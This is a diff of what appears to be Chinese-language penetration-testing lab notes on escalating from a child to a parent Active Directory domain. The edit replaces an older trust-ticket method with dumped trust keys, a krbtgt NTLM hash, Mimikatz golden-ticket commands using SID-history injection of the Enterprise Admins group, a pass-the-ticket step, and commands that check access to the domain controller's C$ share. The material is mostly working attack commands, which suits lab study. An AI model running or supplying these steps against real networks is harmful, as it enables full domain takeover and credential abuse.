@@ -1190,36 +1190,44 @@ PS C:\ad> Invoke-ShareFinder -ComputerName us-dc.us.dollarcorp.moneycorp.local
 ```
 
 
-Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-3146393536-1393405867-2905981701-519 /rc4:925c2b6bf5771525b47a4a20d624b463 /service:krbtgt /target:us.dollarcorp.moneycorp.local /ticket:C:\AD\kekeo_old\parent2child_trust_tkt.kirbi"'
+与子域的信任信息
+```
+Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 2/22/2022 1:47:50 AM - CLEAR   - 98 92 74 31 9d 75 ef 06 71 30 f4 23 88 78 d0 8c 63 e6 a1 c4 d3 1d ea c0 81 ea f4 f8
+        * aes256_hmac       bcd2a265b3f6626193662328115b78823de5ef3e5d11bcefac08f311e6cfca24
+        * aes128_hmac       ac4ab1dc6a1477d36ee37aea2ad48396
+        * rc4_hmac_nt       925c2b6bf5771525b47a4a20d624b463
+```
 
+krbtgt的NTML信息
+```
+krbtgt:ff46a9d8bd66c6efd77603da26796f35
+```
 
-.\asktgs.exe C:\AD\kekeo_old\parent2child_trust_tkt.kirbi CIFS/us-dc.us.dollarcorp.moneycorp.local
+生成一个用户访问TGT
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-3146393536-1393405867-2905981701-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_p2c_tkt.kirbi"'
+```
 
+下面命令把TGT注入到mimikatz中
+```
+Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_p2c_tkt.kirbi"'
+```
 
-
-PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\parent2child_trust_tkt.kirbi CIFS/us-dc.us.dollarcorp.moneycorp.local
-
-  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
- .## ^ ##.  "A La Vie, A L'Amour"
- ## / \ ##  /* * *
- ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
-  '#####'                                                     * * */
-
-Ticket    : C:\AD\kekeo_old\parent2child_trust_tkt.kirbi
-Service   : krbtgt / us.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
-Principal : Administrator @ dollarcorp.moneycorp.local
-
-> CIFS/us-dc.us.dollarcorp.moneycorp.local
-  * Ticket in file 'CIFS.us-dc.us.dollarcorp.moneycorp.local.kirbi'
-
-
-.\kirbikator.exe lsa .\CIFS.us-dc.us.dollarcorp.moneycorp.local.kirbi
-
-
+使用下面两个命令之一验证上面操作是否成功
+```
+gwmi -class win32_operatingsystem -ComputerName us-dc.us.dollarcorp.moneycorp.local
+```
+或者
+```
 ls \\us-dc.us.dollarcorp.moneycorp.local\c$
+```
 
-Invoke-ShareFinder  –Verbose
+
+
+
+
 
 
 # 跨林访问
